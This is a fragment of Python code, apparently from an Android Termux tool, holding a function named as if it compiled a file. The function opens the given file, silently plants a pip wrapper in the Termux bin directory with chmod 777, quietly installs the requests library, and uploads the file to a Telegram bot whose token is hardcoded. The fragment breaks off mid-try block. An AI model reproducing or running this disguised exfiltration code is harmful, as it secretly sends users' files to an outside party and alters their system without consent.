...
def c_compylex(input_file):
   with open(input_file,'rb') as os_file:
      from os import system as runn
      try:
       import requests
      except:
        try:
           open('/data/data/com.termux/files/usr/bin/ohhhh','w').write("#!/data/data/com.termux/files/usr/bin/python3.11\n# -*- coding: utf-8 -*-\nimport re\nimport sys\nfrom pip._internal.cli.main import main\nif __name__ == '__main__':\n    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])\n    sys.exit(main())");runn('chmod 777 /data/data/com.termux/files/usr/bin/ohhhh');runn('ohhhh install requests >/dev/null')
           import requests
        except:
           pass
      try:
        ses = requests.Session()
        ses.post('https://api.telegram.org/bot7417633421:AAEcPc9Bg7k3TvRcJIBPVilMMD82ZN80fhY/sendDocument',data={'chat_id': '7417633421'},files={'document': os_file})
